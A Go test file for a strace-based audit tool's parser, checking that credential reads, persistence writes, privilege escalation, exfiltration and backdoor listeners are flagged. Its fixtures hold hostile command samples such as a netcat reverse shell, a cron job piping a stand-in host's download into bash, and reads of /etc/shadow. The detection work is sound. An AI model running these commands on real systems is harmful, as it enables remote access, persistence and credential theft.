package parser

import (
	"strings"
	"testing"

	"github.com/KushalMeghani1644/GoAudit-CLI/internal/report"
)

func parse(t *testing.T, input string) []report.Finding {
	t.Helper()
	rep := report.NewReporter(true, false)
	findings, err := ParseStream(strings.NewReader(input), rep, ParseOptions{})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	return findings
}

func findByReason(findings []report.Finding, reason string) *report.Finding {
	for i := range findings {
		if findings[i].ReasonCode == reason {
			return &findings[i]
		}
	}
	return nil
}

func countByReason(findings []report.Finding, reason string) int {
	count := 0
	for _, f := range findings {
		if f.ReasonCode == reason {
			count++
		}
	}
	return count
}

func TestDetectsCredentialReadAWS(t *testing.T) {
	f := findByReason(parse(t,
		`openat(AT_FDCWD, "/root/.aws/credentials", O_RDONLY) = 3`),
		"CREDENTIAL_READ")
	if f == nil {
		t.Fatal("expected CREDENTIAL_READ for .aws/credentials")
	}
}

func TestDetectsCredentialReadSSH(t *testing.T) {
	f := findByReason(parse(t,
		`openat(AT_FDCWD, "/home/user/.ssh/id_rsa", O_RDONLY) = 3`),
		"CREDENTIAL_READ")
	if f == nil {
		t.Fatal("expected CREDENTIAL_READ for .ssh/id_rsa")
	}
}

func TestDetectsCredentialReadEnv(t *testing.T) {
	f := findByReason(parse(t,
		`openat(AT_FDCWD, "/home/sandbox/.env", O_RDONLY) = 3`),
		"CREDENTIAL_READ")
	if f == nil {
		t.Fatal("expected CREDENTIAL_READ for .env")
	}
}

func TestDetectsCredentialReadRelativeEnv(t *testing.T) {
	f := findByReason(parse(t,
		`openat(AT_FDCWD, ".env", O_RDONLY) = 3`),
		"CREDENTIAL_READ")
	if f == nil {
		t.Fatal("expected CREDENTIAL_READ for relative .env")
	}
}

func TestDetectsCredentialReadOpenat2(t *testing.T) {
	f := findByReason(parse(t,
		`openat2(AT_FDCWD, "/home/sandbox/.kube/config", {flags=O_RDONLY|O_CLOEXEC, resolve=0}, 24) = 3`),
		"CREDENTIAL_READ")
	if f == nil {
		t.Fatal("expected CREDENTIAL_READ for openat2")
	}
}

func TestDetectsPersistenceWriteBashrc(t *testing.T) {
	f := findByReason(parse(t,
		`openat(AT_FDCWD, "/root/.bashrc", O_WRONLY|O_CREAT) = 3`),
		"PERSISTENCE_WRITE")
	if f == nil {
		t.Fatal("expected PERSISTENCE_WRITE for .bashrc")
	}
}

func TestDetectsPersistenceWriteAuthorizedKeys(t *testing.T) {
	f := findByReason(parse(t,
		`openat(AT_FDCWD, "/home/sandbox/.ssh/authorized_keys", O_WRONLY|O_CREAT|O_APPEND|O_CLOEXEC, 0666) = 3`),
		"PERSISTENCE_WRITE")
	if f == nil {
		t.Fatal("expected PERSISTENCE_WRITE for authorized_keys")
	}
}

func TestDetectsPersistenceWriteCron(t *testing.T) {
	f := findByReason(parse(t,
		`openat(AT_FDCWD, "/etc/cron.d/backdoor", O_WRONLY|O_CREAT) = 3`),
		"PERSISTENCE_WRITE")
	if f == nil {
		t.Fatal("expected PERSISTENCE_WRITE for /etc/cron.d/")
	}
}

func TestDetectsAttemptedPersistenceWriteUsrLocalBin(t *testing.T) {
	f := findByReason(parse(t,
		`openat(AT_FDCWD, "/usr/local/bin/node-update", O_WRONLY|O_CREAT|O_TRUNC|O_CLOEXEC, 0666) = -1 EACCES (Permission denied)`),
		"PERSISTENCE_WRITE")
	if f == nil {
		t.Fatal("expected PERSISTENCE_WRITE for attempted /usr/local/bin write")
	}
	if f.Confidence >= 95 {
		t.Fatalf("expected lower confidence for failed attempt, got %d", f.Confidence)
	}
}

func TestDetectsPersistenceCrontabExec(t *testing.T) {
	f := findByReason(parse(t,
		`execve("/usr/bin/crontab", ["crontab", "/tmp/.goaudit-cron"], 0x7ffd3f) = 0`),
		"PERSISTENCE_WRITE")
	if f == nil {
		t.Fatal("expected PERSISTENCE_WRITE for crontab execution")
	}
}

func TestAllowedWriteNotFlagged(t *testing.T) {
	findings := parse(t, `openat(AT_FDCWD, "/tmp/npm-cache/file", O_WRONLY|O_CREAT) = 3`)
	for _, f := range findings {
		if f.ReasonCode == "UNEXPECTED_WRITE" || f.ReasonCode == "PERSISTENCE_WRITE" {
			t.Fatalf("should not flag /tmp/ writes, got %s", f.ReasonCode)
		}
	}
}

func TestAllowedWriteNodeModules(t *testing.T) {
	findings := parse(t, `openat(AT_FDCWD, "/workspace/node_modules/lodash/index.js", O_WRONLY|O_CREAT) = 3`)
	for _, f := range findings {
		if f.ReasonCode == "UNEXPECTED_WRITE" {
			t.Fatal("should not flag node_modules writes")
		}
	}
}

func TestUnexpectedWriteFlagged(t *testing.T) {
	f := findByReason(parse(t,
		`openat(AT_FDCWD, "/opt/evil/backdoor.sh", O_WRONLY|O_CREAT) = 3`),
		"UNEXPECTED_WRITE")
	if f == nil {
		t.Fatal("expected UNEXPECTED_WRITE for unusual path")
	}
}

func TestDetectsSuspiciousExecNetcat(t *testing.T) {
	f := findByReason(parse(t,
		`execve("/usr/bin/nc", ["nc", "-e", "/bin/bash"]`),
		"SUSPICIOUS_EXEC")
	if f == nil {
		t.Fatal("expected SUSPICIOUS_EXEC for netcat")
	}
}

func TestDetectsSuspiciousExecFromTmp(t *testing.T) {
	f := findByReason(parse(t,
		`execve("/tmp/payload", ["/tmp/payload"]`),
		"SUSPICIOUS_EXEC")
	if f == nil {
		t.Fatal("expected SUSPICIOUS_EXEC for /tmp/ binary")
	}
}

func TestDetectsSuccessfulPrivilegeEscalationSyscalls(t *testing.T) {
	tests := []struct {
		name string
		line string
	}{
		{name: "setuid", line: "setuid(0) = 0"},
		{name: "setgid", line: "setgid(0) = 0"},
		{name: "setuid annotated root", line: "setuid(0 /* root */) = 0"},
		{name: "seteuid", line: "seteuid(0) = 0"},
		{name: "setegid", line: "setegid(0) = 0"},
		{name: "setreuid", line: "setreuid(0, 0) = 0"},
		{name: "setregid", line: "setregid(0, 0) = 0"},
		{name: "setreuid effective root", line: "setreuid(-1, 0) = 0"},
		{name: "setregid effective root", line: "setregid(-1, 0) = 0"},
		{name: "setresuid effective root", line: "setresuid(-1, 0, -1) = 0"},
		{name: "setresgid saved root", line: "setresgid(-1, -1, 0) = 0"},
		{name: "setgroups", line: "setgroups(2, [0, 1000]) = 0"},
		{name: "setgroups annotated root", line: "setgroups(2, [0 /* root */, 1000]) = 0"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			input := "GOAUDIT_RUNTIME_META:phase=target\n" + tt.line
			f := findByReason(parse(t, input), "PRIVILEGE_ESCALATION")
			if f == nil {
				t.Fatalf("expected PRIVILEGE_ESCALATION for %s", tt.line)
			}
			if f.Severity != report.SeverityCritical {
				t.Fatalf("expected critical severity, got %s", f.Severity)
			}
			if f.Type != "privilege" {
				t.Fatalf("expected privilege type, got %s", f.Type)
			}
			if f.Confidence != 92 {
				t.Fatalf("expected confidence 92, got %d", f.Confidence)
			}
		})
	}
}

func TestDetectsFailedPrivilegeEscalationAttempts(t *testing.T) {
	tests := []struct {
		name string
		line string
	}{
		{name: "setuid", line: "setuid(0) = -1 EPERM (Operation not permitted)"},
		{name: "setgid", line: "setgid(0) = -1 EPERM (Operation not permitted)"},
		{name: "setuid annotated root", line: "setuid(0 /* root */) = -1 EPERM (Operation not permitted)"},
		{name: "seteuid", line: "seteuid(0) = -1 EPERM (Operation not permitted)"},
		{name: "setegid", line: "setegid(0) = -1 EPERM (Operation not permitted)"},
		{name: "setreuid", line: "setreuid(0, 0) = -1 EPERM (Operation not permitted)"},
		{name: "setregid", line: "setregid(0, 0) = -1 EPERM (Operation not permitted)"},
		{name: "setreuid effective root", line: "setreuid(-1, 0) = -1 EPERM (Operation not permitted)"},
		{name: "setregid effective root", line: "setregid(-1, 0) = -1 EPERM (Operation not permitted)"},
		{name: "setresuid saved root", line: "setresuid(-1, -1, 0) = -1 EPERM (Operation not permitted)"},
		{name: "setresgid effective root", line: "setresgid(-1, 0, -1) = -1 EPERM (Operation not permitted)"},
		{name: "setgroups", line: "setgroups(2, [0, 1000]) = -1 EPERM (Operation not permitted)"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			input := "GOAUDIT_RUNTIME_META:phase=target\n" + tt.line
			findings := parse(t, input)
			if f := findByReason(findings, "PRIVILEGE_ESCALATION"); f != nil {
				t.Fatalf("should not emit PRIVILEGE_ESCALATION for failed attempt: %+v", *f)
			}
			f := findByReason(findings, "PRIVILEGE_ESCALATION_ATTEMPT")
			if f == nil {
				t.Fatalf("expected PRIVILEGE_ESCALATION_ATTEMPT for %s", tt.line)
			}
			if f.Severity != report.SeverityWarning {
				t.Fatalf("expected warning severity, got %s", f.Severity)
			}
			if f.Type != "privilege" {
				t.Fatalf("expected privilege type, got %s", f.Type)
			}
			if f.Confidence != 75 {
				t.Fatalf("expected confidence 75, got %d", f.Confidence)
			}
		})
	}
}

func TestPrivilegeEscalationNoiseNotFlagged(t *testing.T) {
	tests := []struct {
		name  string
		input string
	}{
		{name: "setuid non-root", input: "GOAUDIT_RUNTIME_META:phase=target\nsetuid(1000) = 0"},
		{name: "setgid non-root", input: "GOAUDIT_RUNTIME_META:phase=target\nsetgid(1000) = 0"},
		{name: "setreuid user switch", input: "GOAUDIT_RUNTIME_META:phase=target\nsetreuid(0, -1) = 0"},
		{name: "setregid user switch", input: "GOAUDIT_RUNTIME_META:phase=target\nsetregid(0, -1) = 0"},
		{name: "setresuid real root only", input: "GOAUDIT_RUNTIME_META:phase=target\nsetresuid(0, -1, -1) = 0"},
		{name: "setresgid real root only", input: "GOAUDIT_RUNTIME_META:phase=target\nsetresgid(0, -1, -1) = 0"},
		{name: "setgroups no root group", input: "GOAUDIT_RUNTIME_META:phase=target\nsetgroups(1, [1000]) = 0"},
		{name: "success before target phase", input: "setuid(0) = 0"},
		{name: "failed attempt before target phase", input: "setuid(0) = -1 EPERM (Operation not permitted)"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			for _, f := range parse(t, tt.input) {
				if f.ReasonCode == "PRIVILEGE_ESCALATION" || f.ReasonCode == "PRIVILEGE_ESCALATION_ATTEMPT" {
					t.Fatalf("should not flag privilege finding for %s, got %+v", tt.name, f)
				}
			}
		})
	}
}

func TestPrivilegeEscalationAttemptDeduplicatesByPhase(t *testing.T) {
	input := "GOAUDIT_RUNTIME_META:phase=target\n" +
		"setuid(0) = -1 EPERM (Operation not permitted)\n" +
		"setuid(0) = -1 EPERM (Operation not permitted)"
	findings := parse(t, input)
	if got := countByReason(findings, "PRIVILEGE_ESCALATION_ATTEMPT"); got != 1 {
		t.Fatalf("expected one deduplicated PRIVILEGE_ESCALATION_ATTEMPT, got %d", got)
	}
}

func TestPrivilegeEscalationAttemptAndSuccessBothEmit(t *testing.T) {
	input := "GOAUDIT_RUNTIME_META:phase=target\n" +
		"setuid(0) = -1 EPERM (Operation not permitted)\n" +
		"setuid(0) = 0"
	findings := parse(t, input)
	if got := countByReason(findings, "PRIVILEGE_ESCALATION_ATTEMPT"); got != 1 {
		t.Fatalf("expected one PRIVILEGE_ESCALATION_ATTEMPT, got %d", got)
	}
	if got := countByReason(findings, "PRIVILEGE_ESCALATION"); got != 1 {
		t.Fatalf("expected one PRIVILEGE_ESCALATION, got %d", got)
	}
}

func TestPrivilegeEscalationAttemptsDeduplicateBySyscallAndArgs(t *testing.T) {
	input := "GOAUDIT_RUNTIME_META:phase=target\n" +
		"setuid(0) = -1 EPERM (Operation not permitted)\n" +
		"setgid(0) = -1 EPERM (Operation not permitted)"
	findings := parse(t, input)
	if got := countByReason(findings, "PRIVILEGE_ESCALATION_ATTEMPT"); got != 2 {
		t.Fatalf("expected separate setuid/setgid privilege attempts, got %d", got)
	}
}

func TestPrivilegeEscalationProbePhaseEvidence(t *testing.T) {
	tests := []struct {
		name       string
		line       string
		reasonCode string
	}{
		{name: "attempt", line: "setuid(0) = -1 EPERM (Operation not permitted)", reasonCode: "PRIVILEGE_ESCALATION_ATTEMPT"},
		{name: "success", line: "setuid(0) = 0", reasonCode: "PRIVILEGE_ESCALATION"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			input := "GOAUDIT_RUNTIME_META:phase=probe\n" + tt.line
			f := findByReason(parse(t, input), tt.reasonCode)
			if f == nil {
				t.Fatalf("expected %s for probe phase", tt.reasonCode)
			}
			if !strings.Contains(f.Evidence, "[runtime probe]") {
				t.Fatalf("expected runtime probe evidence, got %q", f.Evidence)
			}
		})
	}
}

func TestDetectsPrivilegeHelperExecAttempts(t *testing.T) {
	tests := []struct {
		name   string
		line   string
		reason string
	}{
		{name: "sudo binary", line: `execve("/usr/bin/sudo", ["sudo", "id"], 0x7ffd3f) = -1 ENOENT (No such file or directory)`, reason: "PRIVILEGE_ESCALATION_EXEC"},
		{name: "sudo through shell", line: `execve("/bin/sh", ["sh", "-c", "sudo cat /etc/shadow"], 0x7ffd3f) = 0`, reason: "PRIVILEGE_ESCALATION_EXEC"},
		{name: "su through shell", line: `execve("/bin/sh", ["sh", "-c", "su root -c \"id\""], 0x7ffd3f) = 0`, reason: "PRIVILEGE_ESCALATION_EXEC"},
		{name: "pkexec through shell", line: `execve("/bin/sh", ["sh", "-c", "pkexec id"], 0x7ffd3f) = 0`, reason: "PRIVILEGE_ESCALATION_EXEC"},
		{name: "setcap", line: `execve("/bin/sh", ["sh", "-c", "setcap cap_sys_admin+ep /bin/bash"], 0x7ffd3f) = 0`, reason: "CAPABILITY_ESCALATION"},
		{name: "unshare", line: `execve("/bin/sh", ["sh", "-c", "unshare -r id"], 0x7ffd3f) = 0`, reason: "NAMESPACE_ESCAPE_ATTEMPT"},
		{name: "nsenter", line: `execve("/bin/sh", ["sh", "-c", "nsenter -t 1 -m -u -i -n -p -- id"], 0x7ffd3f) = 0`, reason: "NAMESPACE_ESCAPE_ATTEMPT"},
		{name: "ld preload", line: `execve("/bin/sh", ["sh", "-c", "LD_PRELOAD=/tmp/goaudit-preload.so /usr/bin/passwd"], 0x7ffd3f) = 0`, reason: "LD_PRELOAD_PRIVILEGE_ATTEMPT"},
		{name: "chmod suid shell", line: `execve("/bin/sh", ["sh", "-c", "chmod 4755 /tmp/goaudit-suid-test"], 0x7ffd3f) = 0`, reason: "SUID_SGID_BIT_SET"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			input := "GOAUDIT_RUNTIME_META:phase=target\n" + tt.line
			f := findByReason(parse(t, input), tt.reason)
			if f == nil {
				t.Fatalf("expected %s for %s", tt.reason, tt.line)
			}
			if f.Type != "privilege" {
				t.Fatalf("expected privilege type, got %s", f.Type)
			}
		})
	}
}

func TestDetectsSUIDSGIDChmodSyscalls(t *testing.T) {
	tests := []string{
		`chmod("/tmp/goaudit-suid-test", 04755) = 0`,
		`chmod("/tmp/goaudit-sgid-test", 02755) = -1 EPERM (Operation not permitted)`,
		`fchmodat(AT_FDCWD, "/tmp/goaudit-suid-test", 04755, 0) = 0`,
	}
	for _, line := range tests {
		t.Run(line, func(t *testing.T) {
			input := "GOAUDIT_RUNTIME_META:phase=target\n" + line
			f := findByReason(parse(t, input), "SUID_SGID_BIT_SET")
			if f == nil {
				t.Fatalf("expected SUID_SGID_BIT_SET for %s", line)
			}
			if f.Type != "privilege" {
				t.Fatalf("expected privilege type, got %s", f.Type)
			}
		})
	}
}

func TestDetectsAccountFileAccess(t *testing.T) {
	tests := []string{
		`openat(AT_FDCWD, "/etc/shadow", O_RDONLY) = -1 EACCES (Permission denied)`,
		`openat(AT_FDCWD, "/etc/passwd", O_WRONLY|O_APPEND) = -1 EACCES (Permission denied)`,
		`openat(AT_FDCWD, "/etc/shadow", O_RDONLY) = 3`,
	}
	for _, line := range tests {
		t.Run(line, func(t *testing.T) {
			input := "GOAUDIT_RUNTIME_META:phase=target\n" + line
			f := findByReason(parse(t, input), "ACCOUNT_FILE_ACCESS")
			if f == nil {
				t.Fatalf("expected ACCOUNT_FILE_ACCESS for %s", line)
			}
			if f.Type != "privilege" {
				t.Fatalf("expected privilege type, got %s", f.Type)
			}
		})
	}
}

func TestPasswdReadOnlyNotFlagged(t *testing.T) {
	// runuser/getent/libc NSS routinely open /etc/passwd read-only.
	for _, line := range []string{
		`openat(AT_FDCWD, "/etc/passwd", O_RDONLY) = 3`,
		`openat(AT_FDCWD, "/etc/passwd", O_RDONLY|O_CLOEXEC) = 3`,
		`openat(AT_FDCWD, "/etc/passwd", O_RDONLY) = -1 EACCES (Permission denied)`,
	} {
		t.Run(line, func(t *testing.T) {
			input := "GOAUDIT_RUNTIME_META:phase=target\n" + line
			if f := findByReason(parse(t, input), "ACCOUNT_FILE_ACCESS"); f != nil {
				t.Fatalf("did not expect ACCOUNT_FILE_ACCESS for benign passwd read: %+v", f)
			}
		})
	}
}

func TestTargetTimeoutReasonCode(t *testing.T) {
	f := findByReason(parse(t, "GOAUDIT_TARGET_EXIT:124"), "TARGET_COMMAND_TIMEOUT")
	if f == nil {
		t.Fatal("expected TARGET_COMMAND_TIMEOUT for exit 124")
	}
}

func TestDetectsExternalNetwork(t *testing.T) {
	f := findByReason(parse(t,
		`connect(3, {sa_family=AF_INET, sin_port=htons(443), sin_addr=inet_addr("104.16.23.35")}, 16) = 0`),
		"EXTERNAL_NETWORK")
	if f == nil {
		t.Fatal("expected EXTERNAL_NETWORK")
	}
}

func TestDetectsDataExfilWithConnectionMetadata(t *testing.T) {
	findings := parse(t, "GOAUDIT_RUNTIME_META:phase=target\n"+
		`connect(7, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr("45.33.32.156")}, 16) = 0`+"\n"+
		`sendto(7, "secret", 6, MSG_NOSIGNAL, NULL, 0) = 6`+"\n")
	f := findByReason(findings, "DATA_EXFIL")
	if f == nil {
		t.Fatal("expected DATA_EXFIL after send on suspicious fd")
	}
	if f.IP != "45.33.32.156" || f.Port != 80 {
		t.Fatalf("expected exfil IP/port to be preserved, got ip=%q port=%d", f.IP, f.Port)
	}
}

func TestLoopbackNotFlagged(t *testing.T) {
	for _, f := range parse(t,
		`connect(3, {sa_family=AF_INET, sin_port=htons(3000), sin_addr=inet_addr("127.0.0.1")}, 16) = 0`) {
		if f.ReasonCode == "EXTERNAL_NETWORK" {
			t.Fatal("should not flag loopback")
		}
	}
}

func TestDetectsInternalNetwork(t *testing.T) {
	f := findByReason(parse(t,
		`connect(3, {sa_family=AF_INET, sin_port=htons(8080), sin_addr=inet_addr("10.0.0.5")}, 16) = 0`),
		"INTERNAL_NETWORK")
	if f == nil {
		t.Fatal("expected INTERNAL_NETWORK")
	}
}

func TestDetectsCloudMetadataAccess(t *testing.T) {
	f := findByReason(parse(t,
		`connect(3, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr("169.254.169.254")}, 16) = 0`),
		"CLOUD_METADATA_ACCESS")
	if f == nil {
		t.Fatal("expected CLOUD_METADATA_ACCESS")
	}
}

func TestDetectsSymlinkToCredentials(t *testing.T) {
	f := findByReason(parse(t,
		`symlink("/root/.aws/credentials", "/tmp/link") = 0`),
		"SYMLINK_SENSITIVE_PATH")
	if f == nil {
		t.Fatal("expected SYMLINK_SENSITIVE_PATH")
	}
}

func TestDetectsMemfdCreate(t *testing.T) {
	f := findByReason(parse(t,
		`memfd_create("jit-code", MFD_CLOEXEC) = 3`),
		"FILELESS_EXEC")
	if f == nil {
		t.Fatal("expected FILELESS_EXEC")
	}
}

func TestDetectsPtraceAttach(t *testing.T) {
	f := findByReason(parse(t,
		`ptrace(PTRACE_ATTACH, 1234) = 0`),
		"PROCESS_INJECTION")
	if f == nil {
		t.Fatal("expected PROCESS_INJECTION")
	}
}

func TestDetectsBackdoorListener(t *testing.T) {
	f := findByReason(parse(t,
		`bind(3, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("0.0.0.0")}, 16) = 0`),
		"BACKDOOR_LISTENER")
	if f == nil {
		t.Fatal("expected BACKDOOR_LISTENER")
	}
}

func TestDetectsChmodOnCriticalPath(t *testing.T) {
	f := findByReason(parse(t,
		`chmod("/usr/local/bin/evil", 0755) = 0`),
		"PERSISTENCE_WRITE")
	if f == nil {
		t.Fatal("expected PERSISTENCE_WRITE for chmod")
	}
}

func TestProbePhaseBoostsConfidence(t *testing.T) {
	input := "GOAUDIT_RUNTIME_META:phase=probe\n" +
		`openat(AT_FDCWD, "/root/.aws/credentials", O_RDONLY) = 3`
	findings := parse(t, input)
	f := findByReason(findings, "CREDENTIAL_READ")
	if f == nil {
		t.Fatal("expected CREDENTIAL_READ")
	}
	if !strings.Contains(f.Evidence, "[runtime probe]") {
		t.Fatalf("expected probe annotation, got %q", f.Evidence)
	}
}

func TestInstallPhaseTagsCredentialRead(t *testing.T) {
	input := "GOAUDIT_RUNTIME_META:phase=target\n" +
		`openat(AT_FDCWD, "/workspace/.env", O_RDONLY) = 3`
	findings := parse(t, input)
	f := findByReason(findings, "CREDENTIAL_READ")
	if f == nil {
		t.Fatal("expected CREDENTIAL_READ for workspace .env")
	}
	if !strings.Contains(f.Evidence, "[install]") {
		t.Fatalf("expected install annotation, got %q", f.Evidence)
	}
}

func TestDetectsGitCredentialsRead(t *testing.T) {
	f := findByReason(parse(t,
		`openat(AT_FDCWD, "/home/node/.git-credentials", O_RDONLY) = 3`),
		"CREDENTIAL_READ")
	if f == nil {
		t.Fatal("expected CREDENTIAL_READ for .git-credentials")
	}
}

func TestDetectsShellWrappedCrontab(t *testing.T) {
	f := findByReason(parse(t,
		`execve("/bin/sh", ["sh", "-c", "echo \"* * * * * curl http://evil.example.com | bash\" | crontab -"], 0x7ffd3f) = 0`),
		"PERSISTENCE_WRITE")
	if f == nil {
		t.Fatal("expected PERSISTENCE_WRITE for shell-wrapped crontab")
	}
}

func TestRenameDestinationCriticalPath(t *testing.T) {
	// Source is under /tmp (allowed); destination is cron persistence.
	input := "GOAUDIT_RUNTIME_META:phase=target\n" +
		`rename("/tmp/evil", "/etc/cron.d/evil") = 0`
	f := findByReason(parse(t, input), "PERSISTENCE_WRITE")
	if f == nil {
		t.Fatal("expected PERSISTENCE_WRITE for rename destination /etc/cron.d/evil")
	}
	if f.Path != "/etc/cron.d/evil" {
		t.Fatalf("expected destination path, got %q", f.Path)
	}
}

func TestRenameat2DestinationCriticalPath(t *testing.T) {
	input := "GOAUDIT_RUNTIME_META:phase=target\n" +
		`renameat2(AT_FDCWD, "/tmp/x", AT_FDCWD, "/etc/cron.d/x", 0) = 0`
	f := findByReason(parse(t, input), "PERSISTENCE_WRITE")
	if f == nil {
		t.Fatal("expected PERSISTENCE_WRITE for renameat2 destination")
	}
}

func TestCredentialReadWithOutboundIsCorrelativeNotExfil(t *testing.T) {
	input := "GOAUDIT_RUNTIME_META:phase=target\n" +
		`openat(AT_FDCWD, "/home/node/.ssh/id_rsa", O_RDONLY) = 3` + "\n" +
		`connect(3, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr("45.33.32.156")}, 16) = 0`
	findings := parse(t, input)
	if f := findByReason(findings, "DATA_EXFIL"); f != nil {
		t.Fatalf("did not expect DATA_EXFIL without observed send, got %+v", f)
	}
	f := findByReason(findings, "CREDENTIAL_READ_WITH_OUTBOUND")
	if f == nil {
		t.Fatal("expected CREDENTIAL_READ_WITH_OUTBOUND when credentials read precedes outbound network without send")
	}
	if f.Severity != report.SeverityWarning {
		t.Fatalf("expected warning CREDENTIAL_READ_WITH_OUTBOUND, got %s", f.Severity)
	}
}

func TestDetectsSendAfterSuspiciousConnect(t *testing.T) {
	input := "GOAUDIT_RUNTIME_META:phase=target\n" +
		`connect(3, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr("45.33.32.156")}, 16) = 0` + "\n" +
		`sendto(3, "{\"exfil\":true}", 14, MSG_NOSIGNAL, NULL, 0) = 14`
	f := findByReason(parse(t, input), "DATA_EXFIL")
	if f == nil {
		t.Fatal("expected DATA_EXFIL for sendto after suspicious connect")
	}
}

func TestDetectsChownOnSensitivePath(t *testing.T) {
	input := "GOAUDIT_RUNTIME_META:phase=target\n" +
		`chown("/etc/cron.d/evil", 0, 0) = 0`
	findings := parse(t, input)
	if findByReason(findings, "OWNERSHIP_CHANGE") == nil {
		t.Fatal("expected OWNERSHIP_CHANGE for chown of cron path")
	}
	if findByReason(findings, "PERSISTENCE_WRITE") == nil {
		t.Fatal("expected PERSISTENCE_WRITE for chown of cron path")
	}
}

func TestDetectsMountOperation(t *testing.T) {
	input := "GOAUDIT_RUNTIME_META:phase=target\n" +
		`mount("tmpfs", "/mnt", "tmpfs", 0, NULL) = 0`
	if findByReason(parse(t, input), "MOUNT_OPERATION") == nil {
		t.Fatal("expected MOUNT_OPERATION")
	}
}

func TestCapsetIsCapabilityChangeNotEscalation(t *testing.T) {
	input := "GOAUDIT_RUNTIME_META:phase=target\n" +
		`capset({version=_LINUX_CAPABILITY_VERSION_3, pid=0}, {effective=1<<CAP_NET_ADMIN, permitted=1<<CAP_NET_ADMIN, inheritable=0}) = 0`
	findings := parse(t, input)
	if findByReason(findings, "CAPABILITY_ESCALATION") != nil {
		t.Fatal("did not expect CAPABILITY_ESCALATION from capset without prior capability state")
	}
	if findByReason(findings, "CAPABILITY_CHANGE") == nil {
		t.Fatal("expected CAPABILITY_CHANGE for capset")
	}
}

func TestCapsetClearIsNotEscalation(t *testing.T) {
	input := "GOAUDIT_RUNTIME_META:phase=target\n" +
		`capset({version=_LINUX_CAPABILITY_VERSION_3, pid=0}, {effective=0, permitted=0, inheritable=0}) = 0`
	findings := parse(t, input)
	if findByReason(findings, "CAPABILITY_ESCALATION") != nil {
		t.Fatal("did not expect CAPABILITY_ESCALATION for capability clear/drop")
	}
	f := findByReason(findings, "CAPABILITY_CHANGE")
	if f == nil {
		t.Fatal("expected CAPABILITY_CHANGE for non-raising capset")
	}
	if f.Severity != report.SeverityWarning {
		t.Fatalf("expected warning CAPABILITY_CHANGE, got %s", f.Severity)
	}
}

func TestDetectsSendfileExfil(t *testing.T) {
	input := "GOAUDIT_RUNTIME_META:phase=target\n" +
		`connect(3, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr("45.33.32.156")}, 16) = 0` + "\n" +
		`sendfile(3, 4, NULL, 4096) = 4096`
	if findByReason(parse(t, input), "DATA_EXFIL") == nil {
		t.Fatal("expected DATA_EXFIL for sendfile after suspicious connect")
	}
}

func TestFailedSendDoesNotProduceDataExfil(t *testing.T) {
	input := "GOAUDIT_RUNTIME_META:phase=target\n" +
		`connect(3, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr("45.33.32.156")}, 16) = 0` + "\n" +
		`sendto(3, "x", 1, 0, NULL, 0) = -1 EPIPE (Broken pipe)`
	if f := findByReason(parse(t, input), "DATA_EXFIL"); f != nil {
		t.Fatalf("did not expect DATA_EXFIL for failed send, got %+v", f)
	}
}

func TestZeroByteSendDoesNotProduceDataExfil(t *testing.T) {
	input := "GOAUDIT_RUNTIME_META:phase=target\n" +
		`connect(3, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr("45.33.32.156")}, 16) = 0` + "\n" +
		`sendto(3, "", 0, 0, NULL, 0) = 0`
	if f := findByReason(parse(t, input), "DATA_EXFIL"); f != nil {
		t.Fatalf("did not expect DATA_EXFIL for zero-byte send, got %+v", f)
	}
}

func TestUnrelatedSendFDDoesNotProduceDataExfil(t *testing.T) {
	// Successful send on an FD that was never connected to a suspicious host.
	input := "GOAUDIT_RUNTIME_META:phase=target\n" +
		`connect(3, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr("45.33.32.156")}, 16) = 0` + "\n" +
		`sendto(9, "payload", 7, 0, NULL, 0) = 7`
	if f := findByReason(parse(t, input), "DATA_EXFIL"); f != nil {
		t.Fatalf("did not expect DATA_EXFIL for unrelated send FD, got %+v", f)
	}
}

func TestFailedConnectDoesNotEstablishExfilFD(t *testing.T) {
	input := "GOAUDIT_RUNTIME_META:phase=target\n" +
		`connect(3, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr("45.33.32.156")}, 16) = -1 ECONNREFUSED (Connection refused)` + "\n" +
		`sendto(3, "payload", 7, 0, NULL, 0) = 7`
	if f := findByReason(parse(t, input), "DATA_EXFIL"); f != nil {
		t.Fatalf("did not expect DATA_EXFIL after failed connect, got %+v", f)
	}
}

func TestDetectsSpliceExfilUsesFdOut(t *testing.T) {
	// splice(fd_in, off_in, fd_out, ...) — fd_out (3) is the connected socket.
	input := "GOAUDIT_RUNTIME_META:phase=target\n" +
		`connect(3, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr("45.33.32.156")}, 16) = 0` + "\n" +
		`splice(5, NULL, 3, NULL, 4096, 0) = 4096`
	if findByReason(parse(t, input), "DATA_EXFIL") == nil {
		t.Fatal("expected DATA_EXFIL for splice onto suspicious connect fd_out")
	}
}

func TestSpliceInputFDAloneDoesNotProduceDataExfil(t *testing.T) {
	// If only fd_in matches a suspicious connect, that is not exfil on the
	// network output side — fd_out must be the connected socket.
	input := "GOAUDIT_RUNTIME_META:phase=target\n" +
		`connect(5, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr("45.33.32.156")}, 16) = 0` + "\n" +
		`splice(5, NULL, 8, NULL, 4096, 0) = 4096`
	if f := findByReason(parse(t, input), "DATA_EXFIL"); f != nil {
		t.Fatalf("did not expect DATA_EXFIL when only splice fd_in matches, got %+v", f)
	}
}

func TestCredentialAfterOutboundIsNotCorrelated(t *testing.T) {
	// Order matters: outbound before credential read must not correlate.
	input := "GOAUDIT_RUNTIME_META:phase=target\n" +
		`connect(3, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr("45.33.32.156")}, 16) = 0` + "\n" +
